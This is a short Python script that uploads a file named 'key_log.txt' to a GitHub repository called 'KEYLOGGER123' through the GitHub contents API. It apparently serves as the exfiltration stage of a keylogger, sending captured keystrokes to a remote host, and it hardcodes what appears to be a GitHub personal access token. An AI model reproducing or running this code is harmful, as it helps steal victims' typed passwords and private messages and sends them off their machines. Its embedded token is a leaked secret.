import requests
import base64
import os

def create_path_on_github(repo, path, token):
    url = f"https://api.github.com/repos/{repo}/contents/{path}"
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json"
    }
    data = {
        "message": f"Create {path}",
        "content": ""
    }
    response = requests.put(url, json=data, headers=headers)
    if response.status_code == 201:
        print(f"Created path {path} on GitHub repository {repo}")
    else:
        print(f"Failed to create path {path}. Status code: {response.status_code}")
        print(f"Response: {response.json()}")

def upload_file_to_github(repo, path, token, file_path):
    with open(file_path, 'rb') as file:
        content = base64.b64encode(file.read()).decode('utf-8')

    file_name = file_path.split("/")[-1]
    url = f"https://api.github.com/repos/{repo}/contents/{path}/{file_name}"
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json"
    }
    data = {
        "message": f"Update {file_name}",
        "content": content,
        "sha": get_sha(repo, path, token, file_name)
    }

    response = requests.put(url, json=data, headers=headers)
    if response.status_code == 200:
        print(f"Updated {file_name} on GitHub repository {repo}")
    else:
        print(f"Failed to update {file_name}. Status code: {response.status_code}")
        print(f"Response: {response.json()}")

def get_sha(repo, path, token, file_name):
    url = f"https://api.github.com/repos/{repo}/contents/{path}/{file_name}"
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()["sha"]
    else:
        print(f"Failed to get SHA for {file_name}. Status code: {response.status_code}")
        print(f"Response: {response.json()}")

def main():
    repo = "KenjiProjects/KEYLOGGER123"  # Replace with your GitHub username and repository name
    path = "result"  # Replace with the path in the repository where the file will be stored
    token = "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"  # Replace with your GitHub personal access token
    file_path = "key_log.txt"  # Path to your key_log.txt

    # Create the path if it does not exist
    create_path_on_github(repo, path, token)

    upload_file_to_github(repo, path, token, file_path)

if __name__ == "__main__":
    main()
